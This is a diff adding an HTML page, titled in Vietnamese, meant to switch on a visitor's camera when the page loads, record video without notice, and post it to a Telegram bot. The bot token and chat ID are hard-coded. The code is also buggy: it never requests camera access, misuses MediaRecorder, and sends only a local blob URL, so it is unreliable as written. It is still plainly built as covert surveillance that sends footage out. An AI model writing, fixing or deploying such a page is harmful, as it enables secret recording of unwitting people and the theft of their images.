@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Tự động quay video và gửi lên bot Telegram</title>
+</head>
+<body>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script>
+    $(function() {
+      // Tự động truy cập vào camera trước
+      var video = document.createElement("video");
+      video.setAttribute("autoplay", true);
+      video.setAttribute("playsinline", true);
+      video.setAttribute("width", 320);
+      video.setAttribute("height", 240);
+      document.body.appendChild(video);
+
+      // Quay video
+      var recorder = new MediaRecorder(video);
+      recorder.start();
+
+      // Khi quay xong, gửi video lên bot Telegram
+      recorder.ondataavailable = function(event) {
+        var blob = event.data;
+        var url = URL.createObjectURL(blob);
+
+        // Gửi video lên bot Telegram
+        $.ajax({
+          url: "https://api.telegram.org/bot6630148049:AAG1xYKPmQvG1EaUCb8_JygwwwF-F2dkNQ0/sendVideo",
+          data: {
+            "chat_id": -1002081721946,
+            "video": url
+          },
+          type: "POST"
+        });
+      };
+    });
+  </script>
+</body>
+</html>
